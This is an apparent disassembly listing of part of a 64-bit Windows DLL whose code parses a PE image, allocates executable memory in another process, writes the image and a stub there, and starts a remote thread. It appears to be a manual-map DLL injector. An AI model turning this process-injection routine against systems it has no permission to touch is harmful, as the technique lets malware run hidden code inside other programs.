   180002487:	48 b8 ff ff ff ff ff 	movabs $0xfffffffffffffff,%rax
   18000248e:	ff ff 0f 
   180002491:	48 8b f1             	mov    %rcx,%rsi
   180002494:	48 0f bd c8          	bsr    %rax,%rcx
   180002498:	bb 01 00 00 00       	mov    $0x1,%ebx
   18000249d:	8b c3                	mov    %ebx,%eax
   18000249f:	48 d3 e0             	shl    %cl,%rax
   1800024a2:	48 3b d0             	cmp    %rax,%rdx
   1800024a5:	76 0e                	jbe    0x1800024b5
   1800024a7:	48 8d 0d ca 2f 00 00 	lea    0x2fca(%rip),%rcx        # 0x180005478
   1800024ae:	ff 15 54 2c 00 00    	call   *0x2c54(%rip)        # 0x180005108
   1800024b4:	cc                   	int3
   1800024b5:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   1800024b9:	48 89 7c 24 58       	mov    %rdi,0x58(%rsp)
   1800024be:	48 8b 7e 08          	mov    0x8(%rsi),%rdi
   1800024c2:	48 0b c3             	or     %rbx,%rax
   1800024c5:	48 0f bd c8          	bsr    %rax,%rcx
   1800024c9:	4c 8b c7             	mov    %rdi,%r8
   1800024cc:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1800024d1:	ff c1                	inc    %ecx
   1800024d3:	48 d3 e3             	shl    %cl,%rbx
   1800024d6:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   1800024da:	48 8d 14 1b          	lea    (%rbx,%rbx,1),%rdx
   1800024de:	e8 fd fd ff ff       	call   0x1800022e0
   1800024e3:	48 8b 56 08          	mov    0x8(%rsi),%rdx
   1800024e7:	48 8d 43 ff          	lea    -0x1(%rbx),%rax
   1800024eb:	48 89 46 30          	mov    %rax,0x30(%rsi)
   1800024ef:	48 89 5e 38          	mov    %rbx,0x38(%rsi)
   1800024f3:	48 8b 12             	mov    (%rdx),%rdx
   1800024f6:	48 3b d7             	cmp    %rdi,%rdx
   1800024f9:	0f 84 f5 00 00 00    	je     0x1800025f4
   1800024ff:	48 89 6c 24 50       	mov    %rbp,0x50(%rsp)
   180002504:	48 8b ca             	mov    %rdx,%rcx
   180002507:	48 bd 25 23 22 84 e4 	movabs $0xcbf29ce484222325,%rbp
   18000250e:	9c f2 cb 
   180002511:	48 bb b3 01 00 00 00 	movabs $0x100000001b3,%rbx
   180002518:	01 00 00 
   18000251b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002520:	0f b6 41 11          	movzbl 0x11(%rcx),%eax
   180002524:	44 0f b6 59 10       	movzbl 0x10(%rcx),%r11d
   180002529:	48 8b 12             	mov    (%rdx),%rdx
   18000252c:	4c 33 dd             	xor    %rbp,%r11
   18000252f:	4c 0f af db          	imul   %rbx,%r11
   180002533:	4c 33 d8             	xor    %rax,%r11
   180002536:	0f b6 41 12          	movzbl 0x12(%rcx),%eax
   18000253a:	4c 0f af db          	imul   %rbx,%r11
   18000253e:	4c 33 d8             	xor    %rax,%r11
   180002541:	0f b6 41 13          	movzbl 0x13(%rcx),%eax
   180002545:	4c 0f af db          	imul   %rbx,%r11
   180002549:	4c 33 d8             	xor    %rax,%r11
   18000254c:	4c 0f af db          	imul   %rbx,%r11
   180002550:	4c 23 5e 30          	and    0x30(%rsi),%r11
   180002554:	49 c1 e3 04          	shl    $0x4,%r11
   180002558:	4c 03 5e 18          	add    0x18(%rsi),%r11
   18000255c:	4d 8b 0b             	mov    (%r11),%r9
   18000255f:	4c 3b cf             	cmp    %rdi,%r9
   180002562:	75 09                	jne    0x18000256d
   180002564:	49 89 0b             	mov    %rcx,(%r11)
   180002567:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   18000256b:	eb 76                	jmp    0x1800025e3
   18000256d:	49 8b 43 08          	mov    0x8(%r11),%rax
   180002571:	44 8b 41 10          	mov    0x10(%rcx),%r8d
   180002575:	44 3b 40 10          	cmp    0x10(%rax),%r8d
   180002579:	75 2f                	jne    0x1800025aa
   18000257b:	4c 8b 10             	mov    (%rax),%r10
   18000257e:	4c 3b d1             	cmp    %rcx,%r10
   180002581:	74 21                	je     0x1800025a4
   180002583:	4c 8b 49 08          	mov    0x8(%rcx),%r9
   180002587:	49 89 11             	mov    %rdx,(%r9)
   18000258a:	4c 8b 42 08          	mov    0x8(%rdx),%r8
   18000258e:	4d 89 10             	mov    %r10,(%r8)
   180002591:	49 8b 42 08          	mov    0x8(%r10),%rax
   180002595:	48 89 08             	mov    %rcx,(%rax)
   180002598:	4d 89 42 08          	mov    %r8,0x8(%r10)
   18000259c:	4c 89 4a 08          	mov    %r9,0x8(%rdx)
   1800025a0:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1800025a4:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   1800025a8:	eb 39                	jmp    0x1800025e3
   1800025aa:	4c 3b c8             	cmp    %rax,%r9
   1800025ad:	74 10                	je     0x1800025bf
   1800025af:	90                   	nop
   1800025b0:	48 8b 40 08          	mov    0x8(%rax),%rax
   1800025b4:	44 3b 40 10          	cmp    0x10(%rax),%r8d
   1800025b8:	74 4b                	je     0x180002605
   1800025ba:	4c 3b c8             	cmp    %rax,%r9
   1800025bd:	75 f1                	jne    0x1800025b0
   1800025bf:	4c 8b 51 08          	mov    0x8(%rcx),%r10
   1800025c3:	49 89 12             	mov    %rdx,(%r10)
   1800025c6:	4c 8b 4a 08          	mov    0x8(%rdx),%r9
   1800025ca:	49 89 01             	mov    %rax,(%r9)
   1800025cd:	4c 8b 40 08          	mov    0x8(%rax),%r8
   1800025d1:	49 89 08             	mov    %rcx,(%r8)
   1800025d4:	4c 89 48 08          	mov    %r9,0x8(%rax)
   1800025d8:	4c 89 52 08          	mov    %r10,0x8(%rdx)
   1800025dc:	4c 89 41 08          	mov    %r8,0x8(%rcx)
   1800025e0:	49 89 0b             	mov    %rcx,(%r11)
   1800025e3:	48 8b ca             	mov    %rdx,%rcx
   1800025e6:	48 3b d7             	cmp    %rdi,%rdx
   1800025e9:	0f 85 31 ff ff ff    	jne    0x180002520
   1800025ef:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   1800025f4:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   1800025f9:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   1800025fe:	48 83 c4 28          	add    $0x28,%rsp
   180002602:	5e                   	pop    %rsi
   180002603:	5b                   	pop    %rbx
   180002604:	c3                   	ret
   180002605:	4c 8b 10             	mov    (%rax),%r10
   180002608:	4c 8b 49 08          	mov    0x8(%rcx),%r9
   18000260c:	49 89 11             	mov    %rdx,(%r9)
   18000260f:	4c 8b 42 08          	mov    0x8(%rdx),%r8
   180002613:	4d 89 10             	mov    %r10,(%r8)
   180002616:	49 8b 42 08          	mov    0x8(%r10),%rax
   18000261a:	48 89 08             	mov    %rcx,(%rax)
   18000261d:	4d 89 42 08          	mov    %r8,0x8(%r10)
   180002621:	4c 89 4a 08          	mov    %r9,0x8(%rdx)
   180002625:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180002629:	eb b8                	jmp    0x1800025e3
   18000262b:	cc                   	int3
   18000262c:	cc                   	int3
   18000262d:	cc                   	int3
   18000262e:	cc                   	int3
   18000262f:	cc                   	int3
   180002630:	48 8d 05 39 51 00 00 	lea    0x5139(%rip),%rax        # 0x180007770
   180002637:	c3                   	ret
   180002638:	cc                   	int3
   180002639:	cc                   	int3
   18000263a:	cc                   	int3
   18000263b:	cc                   	int3
   18000263c:	cc                   	int3
   18000263d:	cc                   	int3
   18000263e:	cc                   	int3
   18000263f:	cc                   	int3
   180002640:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180002645:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   18000264a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   18000264f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180002654:	53                   	push   %rbx
   180002655:	56                   	push   %rsi
   180002656:	57                   	push   %rdi
   180002657:	48 83 ec 30          	sub    $0x30,%rsp
   18000265b:	48 8b f9             	mov    %rcx,%rdi
   18000265e:	48 8d 74 24 58       	lea    0x58(%rsp),%rsi
   180002663:	b9 01 00 00 00       	mov    $0x1,%ecx
   180002668:	ff 15 d2 2b 00 00    	call   *0x2bd2(%rip)        # 0x180005240
   18000266e:	48 8b d8             	mov    %rax,%rbx
   180002671:	e8 ba ff ff ff       	call   0x180002630
   180002676:	45 33 c9             	xor    %r9d,%r9d
   180002679:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   18000267e:	4c 8b c7             	mov    %rdi,%r8
   180002681:	48 8b d3             	mov    %rbx,%rdx
   180002684:	48 8b 08             	mov    (%rax),%rcx
   180002687:	ff 15 bb 2b 00 00    	call   *0x2bbb(%rip)        # 0x180005248
   18000268d:	48 83 c4 30          	add    $0x30,%rsp
   180002691:	5f                   	pop    %rdi
   180002692:	5e                   	pop    %rsi
   180002693:	5b                   	pop    %rbx
   180002694:	c3                   	ret
   180002695:	cc                   	int3
   180002696:	cc                   	int3
   180002697:	cc                   	int3
   180002698:	cc                   	int3
   180002699:	cc                   	int3
   18000269a:	cc                   	int3
   18000269b:	cc                   	int3
   18000269c:	cc                   	int3
   18000269d:	cc                   	int3
   18000269e:	cc                   	int3
   18000269f:	cc                   	int3
   1800026a0:	40 55                	rex push %rbp
   1800026a2:	57                   	push   %rdi
   1800026a3:	41 56                	push   %r14
   1800026a5:	48 8d 6c 24 f0       	lea    -0x10(%rsp),%rbp
   1800026aa:	48 81 ec 10 01 00 00 	sub    $0x110,%rsp
   1800026b1:	48 8b 05 88 49 00 00 	mov    0x4988(%rip),%rax        # 0x180007040
   1800026b8:	48 33 c4             	xor    %rsp,%rax
   1800026bb:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   1800026bf:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   1800026c4:	4c 8b f2             	mov    %rdx,%r14
   1800026c7:	48 8b f9             	mov    %rcx,%rdi
   1800026ca:	66 39 02             	cmp    %ax,(%rdx)
   1800026cd:	74 13                	je     0x1800026e2
   1800026cf:	48 8d 0d c2 2d 00 00 	lea    0x2dc2(%rip),%rcx        # 0x180005498
   1800026d6:	e8 65 ff ff ff       	call   0x180002640
   1800026db:	32 c0                	xor    %al,%al
   1800026dd:	e9 b1 07 00 00       	jmp    0x180002e93
   1800026e2:	4c 89 bc 24 f0 00 00 	mov    %r15,0xf0(%rsp)
   1800026e9:	00 
   1800026ea:	b8 64 86 00 00       	mov    $0x8664,%eax
   1800026ef:	4c 63 7a 3c          	movslq 0x3c(%rdx),%r15
   1800026f3:	4d 03 fe             	add    %r14,%r15
   1800026f6:	66 41 39 47 04       	cmp    %ax,0x4(%r15)
   1800026fb:	74 13                	je     0x180002710
   1800026fd:	48 8d 0d a4 2d 00 00 	lea    0x2da4(%rip),%rcx        # 0x1800054a8
   180002704:	e8 37 ff ff ff       	call   0x180002640
   180002709:	32 c0                	xor    %al,%al
   18000270b:	e9 7b 07 00 00       	jmp    0x180002e8b
   180002710:	48 8d 0d a9 2d 00 00 	lea    0x2da9(%rip),%rcx        # 0x1800054c0
   180002717:	4c 89 a4 24 00 01 00 	mov    %r12,0x100(%rsp)
   18000271e:	00 
   18000271f:	e8 1c ff ff ff       	call   0x180002640
   180002724:	45 8b 47 50          	mov    0x50(%r15),%r8d
   180002728:	33 d2                	xor    %edx,%edx
   18000272a:	41 b9 00 30 00 00    	mov    $0x3000,%r9d
   180002730:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   180002737:	00 
   180002738:	48 8b cf             	mov    %rdi,%rcx
   18000273b:	ff 15 27 29 00 00    	call   *0x2927(%rip)        # 0x180005068
   180002741:	4c 8b e0             	mov    %rax,%r12
   180002744:	48 85 c0             	test   %rax,%rax
   180002747:	75 1b                	jne    0x180002764
   180002749:	ff 15 f9 28 00 00    	call   *0x28f9(%rip)        # 0x180005048
   18000274f:	8b d0                	mov    %eax,%edx
   180002751:	48 8d 0d 78 2d 00 00 	lea    0x2d78(%rip),%rcx        # 0x1800054d0
   180002758:	e8 e3 fe ff ff       	call   0x180002640
   18000275d:	32 c0                	xor    %al,%al
   18000275f:	e9 1f 07 00 00       	jmp    0x180002e83
   180002764:	48 8d 45 d4          	lea    -0x2c(%rbp),%rax
   180002768:	4c 89 ac 24 f8 00 00 	mov    %r13,0xf8(%rsp)
   18000276f:	00 
   180002770:	45 33 ed             	xor    %r13d,%r13d
   180002773:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002778:	44 89 6d d4          	mov    %r13d,-0x2c(%rbp)
   18000277c:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   180002782:	45 8b 47 50          	mov    0x50(%r15),%r8d
   180002786:	49 8b d4             	mov    %r12,%rdx
   180002789:	48 8b cf             	mov    %rdi,%rcx
   18000278c:	ff 15 c6 28 00 00    	call   *0x28c6(%rip)        # 0x180005058
   180002792:	48 8b 05 b7 28 00 00 	mov    0x28b7(%rip),%rax        # 0x180005050
   180002799:	41 b9 00 10 00 00    	mov    $0x1000,%r9d
   18000279f:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1800027a4:	4d 8b c6             	mov    %r14,%r8
   1800027a7:	48 8b 05 b2 28 00 00 	mov    0x28b2(%rip),%rax        # 0x180005060
   1800027ae:	49 8b d4             	mov    %r12,%rdx
   1800027b1:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   1800027b6:	48 8b cf             	mov    %rdi,%rcx
   1800027b9:	48 8b 05 80 28 00 00 	mov    0x2880(%rip),%rax        # 0x180005040
   1800027c0:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1800027c5:	4c 89 6c 24 70       	mov    %r13,0x70(%rsp)
   1800027ca:	48 c7 44 24 78 01 00 	movq   $0x1,0x78(%rsp)
   1800027d1:	00 00 
   1800027d3:	48 c7 45 88 01 00 00 	movq   $0x1,-0x78(%rbp)
   1800027da:	00 
   1800027db:	4c 89 64 24 68       	mov    %r12,0x68(%rsp)
   1800027e0:	4c 89 6d 80          	mov    %r13,-0x80(%rbp)
   1800027e4:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   1800027e9:	ff 15 49 28 00 00    	call   *0x2849(%rip)        # 0x180005038
   1800027ef:	85 c0                	test   %eax,%eax
   1800027f1:	75 30                	jne    0x180002823
   1800027f3:	ff 15 4f 28 00 00    	call   *0x284f(%rip)        # 0x180005048
   1800027f9:	8b d0                	mov    %eax,%edx
   1800027fb:	48 8d 0d 06 2d 00 00 	lea    0x2d06(%rip),%rcx        # 0x180005508
   180002802:	e8 39 fe ff ff       	call   0x180002640
   180002807:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   18000280d:	45 33 c0             	xor    %r8d,%r8d
   180002810:	49 8b d4             	mov    %r12,%rdx
   180002813:	48 8b cf             	mov    %rdi,%rcx
   180002816:	ff 15 64 28 00 00    	call   *0x2864(%rip)        # 0x180005080
   18000281c:	32 c0                	xor    %al,%al
   18000281e:	e9 58 06 00 00       	jmp    0x180002e7b
   180002823:	48 89 9c 24 40 01 00 	mov    %rbx,0x140(%rsp)
   18000282a:	00 
   18000282b:	41 0f b7 5f 14       	movzwl 0x14(%r15),%ebx
   180002830:	48 83 c3 2c          	add    $0x2c,%rbx
   180002834:	48 89 b4 24 08 01 00 	mov    %rsi,0x108(%rsp)
   18000283b:	00 
   18000283c:	41 8b f5             	mov    %r13d,%esi
   18000283f:	66 45 39 6f 06       	cmp    %r13w,0x6(%r15)
   180002844:	74 41                	je     0x180002887
   180002846:	49 03 df             	add    %r15,%rbx
   180002849:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180002850:	8b 43 fc             	mov    -0x4(%rbx),%eax
   180002853:	85 c0                	test   %eax,%eax
   180002855:	74 21                	je     0x180002878
   180002857:	44 8b 03             	mov    (%rbx),%r8d
   18000285a:	44 8b c8             	mov    %eax,%r9d
   18000285d:	8b 53 f8             	mov    -0x8(%rbx),%edx
   180002860:	4d 03 c6             	add    %r14,%r8
   180002863:	49 03 d4             	add    %r12,%rdx
   180002866:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   18000286b:	48 8b cf             	mov    %rdi,%rcx
   18000286e:	ff 15 c4 27 00 00    	call   *0x27c4(%rip)        # 0x180005038
   180002874:	85 c0                	test   %eax,%eax
   180002876:	74 64                	je     0x1800028dc
   180002878:	41 0f b7 47 06       	movzwl 0x6(%r15),%eax
   18000287d:	ff c6                	inc    %esi
   18000287f:	48 83 c3 28          	add    $0x28,%rbx
   180002883:	3b f0                	cmp    %eax,%esi
   180002885:	75 c9                	jne    0x180002850
   180002887:	33 d2                	xor    %edx,%edx
   180002889:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   180002890:	00 
   180002891:	41 b9 00 30 00 00    	mov    $0x3000,%r9d
   180002897:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   18000289d:	48 8b cf             	mov    %rdi,%rcx
   1800028a0:	ff 15 c2 27 00 00    	call   *0x27c2(%rip)        # 0x180005068
   1800028a6:	4c 8b e8             	mov    %rax,%r13
   1800028a9:	48 85 c0             	test   %rax,%rax
   1800028ac:	75 5c                	jne    0x18000290a
   1800028ae:	ff 15 94 27 00 00    	call   *0x2794(%rip)        # 0x180005048
   1800028b4:	8b d0                	mov    %eax,%edx
   1800028b6:	48 8d 0d 8b 2c 00 00 	lea    0x2c8b(%rip),%rcx        # 0x180005548
   1800028bd:	e8 7e fd ff ff       	call   0x180002640
   1800028c2:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   1800028c8:	45 33 c0             	xor    %r8d,%r8d
   1800028cb:	49 8b d4             	mov    %r12,%rdx
   1800028ce:	48 8b cf             	mov    %rdi,%rcx
   1800028d1:	ff 15 a9 27 00 00    	call   *0x27a9(%rip)        # 0x180005080
   1800028d7:	e9 8d 05 00 00       	jmp    0x180002e69
   1800028dc:	ff 15 66 27 00 00    	call   *0x2766(%rip)        # 0x180005048
   1800028e2:	8b d0                	mov    %eax,%edx
   1800028e4:	48 8d 0d 3d 2c 00 00 	lea    0x2c3d(%rip),%rcx        # 0x180005528
   1800028eb:	e8 50 fd ff ff       	call   0x180002640
   1800028f0:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   1800028f6:	45 33 c0             	xor    %r8d,%r8d
   1800028f9:	49 8b d4             	mov    %r12,%rdx
   1800028fc:	48 8b cf             	mov    %rdi,%rcx
   1800028ff:	ff 15 7b 27 00 00    	call   *0x277b(%rip)        # 0x180005080
   180002905:	e9 5f 05 00 00       	jmp    0x180002e69
   18000290a:	33 db                	xor    %ebx,%ebx
   18000290c:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   180002911:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   180002917:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   18000291c:	49 8b d5             	mov    %r13,%rdx
   18000291f:	48 8b cf             	mov    %rdi,%rcx
   180002922:	ff 15 10 27 00 00    	call   *0x2710(%rip)        # 0x180005038
   180002928:	85 c0                	test   %eax,%eax
   18000292a:	75 43                	jne    0x18000296f
   18000292c:	ff 15 16 27 00 00    	call   *0x2716(%rip)        # 0x180005048
   180002932:	8b d0                	mov    %eax,%edx
   180002934:	48 8d 0d 45 2c 00 00 	lea    0x2c45(%rip),%rcx        # 0x180005580
   18000293b:	e8 00 fd ff ff       	call   0x180002640
   180002940:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   180002946:	45 33 c0             	xor    %r8d,%r8d
   180002949:	49 8b d4             	mov    %r12,%rdx
   18000294c:	48 8b cf             	mov    %rdi,%rcx
   18000294f:	ff 15 2b 27 00 00    	call   *0x272b(%rip)        # 0x180005080
   180002955:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   18000295b:	45 33 c0             	xor    %r8d,%r8d
   18000295e:	49 8b d5             	mov    %r13,%rdx
   180002961:	48 8b cf             	mov    %rdi,%rcx
   180002964:	ff 15 16 27 00 00    	call   *0x2716(%rip)        # 0x180005080
   18000296a:	e9 fa 04 00 00       	jmp    0x180002e69
   18000296f:	33 d2                	xor    %edx,%edx
   180002971:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   180002978:	00 
   180002979:	41 b9 00 30 00 00    	mov    $0x3000,%r9d
   18000297f:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   180002985:	48 8b cf             	mov    %rdi,%rcx
   180002988:	ff 15 da 26 00 00    	call   *0x26da(%rip)        # 0x180005068
   18000298e:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   180002993:	48 8b f0             	mov    %rax,%rsi
   180002996:	48 85 c0             	test   %rax,%rax
   180002999:	75 43                	jne    0x1800029de
   18000299b:	ff 15 a7 26 00 00    	call   *0x26a7(%rip)        # 0x180005048
   1800029a1:	8b d0                	mov    %eax,%edx
   1800029a3:	48 8d 0d f6 2b 00 00 	lea    0x2bf6(%rip),%rcx        # 0x1800055a0
   1800029aa:	e8 91 fc ff ff       	call   0x180002640
   1800029af:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   1800029b5:	45 33 c0             	xor    %r8d,%r8d
   1800029b8:	49 8b d4             	mov    %r12,%rdx
   1800029bb:	48 8b cf             	mov    %rdi,%rcx
   1800029be:	ff 15 bc 26 00 00    	call   *0x26bc(%rip)        # 0x180005080
   1800029c4:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   1800029ca:	45 33 c0             	xor    %r8d,%r8d
   1800029cd:	49 8b d5             	mov    %r13,%rdx
   1800029d0:	48 8b cf             	mov    %rdi,%rcx
   1800029d3:	ff 15 a7 26 00 00    	call   *0x26a7(%rip)        # 0x180005080
   1800029d9:	e9 8b 04 00 00       	jmp    0x180002e69
   1800029de:	41 b9 00 10 00 00    	mov    $0x1000,%r9d
   1800029e4:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1800029e9:	4c 8d 05 c0 04 00 00 	lea    0x4c0(%rip),%r8        # 0x180002eb0
   1800029f0:	48 8b d6             	mov    %rsi,%rdx
   1800029f3:	48 8b cf             	mov    %rdi,%rcx
   1800029f6:	ff 15 3c 26 00 00    	call   *0x263c(%rip)        # 0x180005038
   1800029fc:	85 c0                	test   %eax,%eax
   1800029fe:	75 58                	jne    0x180002a58
   180002a00:	ff 15 42 26 00 00    	call   *0x2642(%rip)        # 0x180005048
   180002a06:	8b d0                	mov    %eax,%edx
   180002a08:	48 8d 0d c1 2b 00 00 	lea    0x2bc1(%rip),%rcx        # 0x1800055d0
   180002a0f:	e8 2c fc ff ff       	call   0x180002640
   180002a14:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   180002a1a:	45 33 c0             	xor    %r8d,%r8d
   180002a1d:	49 8b d4             	mov    %r12,%rdx
   180002a20:	48 8b cf             	mov    %rdi,%rcx
   180002a23:	ff 15 57 26 00 00    	call   *0x2657(%rip)        # 0x180005080
   180002a29:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   180002a2f:	45 33 c0             	xor    %r8d,%r8d
   180002a32:	49 8b d5             	mov    %r13,%rdx
   180002a35:	48 8b cf             	mov    %rdi,%rcx
   180002a38:	ff 15 42 26 00 00    	call   *0x2642(%rip)        # 0x180005080
   180002a3e:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   180002a44:	45 33 c0             	xor    %r8d,%r8d
   180002a47:	48 8b d6             	mov    %rsi,%rdx
   180002a4a:	48 8b cf             	mov    %rdi,%rcx
   180002a4d:	ff 15 2d 26 00 00    	call   *0x262d(%rip)        # 0x180005080
   180002a53:	e9 11 04 00 00       	jmp    0x180002e69
   180002a58:	49 8b d4             	mov    %r12,%rdx
   180002a5b:	48 8d 0d 8e 2b 00 00 	lea    0x2b8e(%rip),%rcx        # 0x1800055f0
   180002a62:	e8 d9 fb ff ff       	call   0x180002640
   180002a67:	49 8b d5             	mov    %r13,%rdx
   180002a6a:	48 8d 0d 97 2b 00 00 	lea    0x2b97(%rip),%rcx        # 0x180005608
   180002a71:	e8 ca fb ff ff       	call   0x180002640
   180002a76:	48 8b d6             	mov    %rsi,%rdx
   180002a79:	48 8d 0d a0 2b 00 00 	lea    0x2ba0(%rip),%rcx        # 0x180005620
   180002a80:	e8 bb fb ff ff       	call   0x180002640
   180002a85:	48 8d 0d ac 2b 00 00 	lea    0x2bac(%rip),%rcx        # 0x180005638
   180002a8c:	e8 af fb ff ff       	call   0x180002640
   180002a91:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   180002a96:	4c 8b ce             	mov    %rsi,%r9
   180002a99:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   180002a9d:	45 33 c0             	xor    %r8d,%r8d
   180002aa0:	33 d2                	xor    %edx,%edx
   180002aa2:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   180002aa7:	48 8b cf             	mov    %rdi,%rcx
   180002aaa:	ff 15 c8 25 00 00    	call   *0x25c8(%rip)        # 0x180005078
   180002ab0:	48 85 c0             	test   %rax,%rax
   180002ab3:	75 58                	jne    0x180002b0d
   180002ab5:	ff 15 8d 25 00 00    	call   *0x258d(%rip)        # 0x180005048
   180002abb:	8b d0                	mov    %eax,%edx
   180002abd:	48 8d 0d 84 2b 00 00 	lea    0x2b84(%rip),%rcx        # 0x180005648
   180002ac4:	e8 77 fb ff ff       	call   0x180002640
   180002ac9:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   180002acf:	45 33 c0             	xor    %r8d,%r8d
   180002ad2:	49 8b d4             	mov    %r12,%rdx
   180002ad5:	48 8b cf             	mov    %rdi,%rcx
   180002ad8:	ff 15 a2 25 00 00    	call   *0x25a2(%rip)        # 0x180005080
   180002ade:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   180002ae4:	45 33 c0             	xor    %r8d,%r8d
   180002ae7:	49 8b d5             	mov    %r13,%rdx
   180002aea:	48 8b cf             	mov    %rdi,%rcx
   180002aed:	ff 15 8d 25 00 00    	call   *0x258d(%rip)        # 0x180005080
   180002af3:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   180002af9:	45 33 c0             	xor    %r8d,%r8d
   180002afc:	48 8b d6             	mov    %rsi,%rdx
   180002aff:	48 8b cf             	mov    %rdi,%rcx
   180002b02:	ff 15 78 25 00 00    	call   *0x2578(%rip)        # 0x180005080
   180002b08:	e9 5c 03 00 00       	jmp    0x180002e69
   180002b0d:	48 8b c8             	mov    %rax,%rcx
   180002b10:	ff 15 12 25 00 00    	call   *0x2512(%rip)        # 0x180005028
   180002b16:	48 8b d6             	mov    %rsi,%rdx
   180002b19:	48 8d 0d 48 2b 00 00 	lea    0x2b48(%rip),%rcx        # 0x180005668
   180002b20:	e8 1b fb ff ff       	call   0x180002640
   180002b25:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   180002b2c:	00 00 00 00 
   180002b30:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   180002b34:	89 5d d0             	mov    %ebx,-0x30(%rbp)
   180002b37:	48 8b cf             	mov    %rdi,%rcx
   180002b3a:	ff 15 48 25 00 00    	call   *0x2548(%rip)        # 0x180005088
   180002b40:	8b 55 d0             	mov    -0x30(%rbp),%edx
   180002b43:	81 fa 03 01 00 00    	cmp    $0x103,%edx
   180002b49:	0f 85 0e 03 00 00    	jne    0x180002e5d
   180002b4f:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002b52:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180002b57:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   180002b5d:	4c 8d 45 90          	lea    -0x70(%rbp),%r8
   180002b61:	49 8b d5             	mov    %r13,%rdx
   180002b64:	48 8b cf             	mov    %rdi,%rcx
   180002b67:	0f 11 45 90          	movups %xmm0,-0x70(%rbp)
   180002b6b:	0f 11 45 a0          	movups %xmm0,-0x60(%rbp)
   180002b6f:	0f 11 45 b0          	movups %xmm0,-0x50(%rbp)
   180002b73:	0f 11 45 c0          	movups %xmm0,-0x40(%rbp)
   180002b77:	ff 15 f3 24 00 00    	call   *0x24f3(%rip)        # 0x180005070
   180002b7d:	48 8b 5d b0          	mov    -0x50(%rbp),%rbx
   180002b81:	48 81 fb 40 40 40 00 	cmp    $0x404040,%rbx
   180002b88:	0f 84 be 02 00 00    	je     0x180002e4c
   180002b8e:	48 81 fb 50 50 50 00 	cmp    $0x505050,%rbx
   180002b95:	75 0c                	jne    0x180002ba3
   180002b97:	48 8d 0d 32 2b 00 00 	lea    0x2b32(%rip),%rcx        # 0x1800056d0
   180002b9e:	e8 9d fa ff ff       	call   0x180002640
   180002ba3:	b9 0a 00 00 00       	mov    $0xa,%ecx
   180002ba8:	ff 15 6a 24 00 00    	call   *0x246a(%rip)        # 0x180005018
   180002bae:	48 85 db             	test   %rbx,%rbx
   180002bb1:	bb 00 00 00 00       	mov    $0x0,%ebx
   180002bb6:	0f 84 74 ff ff ff    	je     0x180002b30
   180002bbc:	b9 00 00 40 01       	mov    $0x1400000,%ecx
   180002bc1:	ff 15 e1 25 00 00    	call   *0x25e1(%rip)        # 0x1800051a8
   180002bc7:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180002bcc:	4c 8b f0             	mov    %rax,%r14
   180002bcf:	48 85 c0             	test   %rax,%rax
   180002bd2:	75 11                	jne    0x180002be5
   180002bd4:	48 8d 0d 1d 2b 00 00 	lea    0x2b1d(%rip),%rcx        # 0x1800056f8
   180002bdb:	e8 60 fa ff ff       	call   0x180002640
   180002be0:	e9 84 02 00 00       	jmp    0x180002e69
   180002be5:	33 d2                	xor    %edx,%edx
   180002be7:	41 b8 00 00 40 01    	mov    $0x1400000,%r8d
   180002bed:	49 8b ce             	mov    %r14,%rcx
   180002bf0:	e8 49 17 00 00       	call   0x18000433e
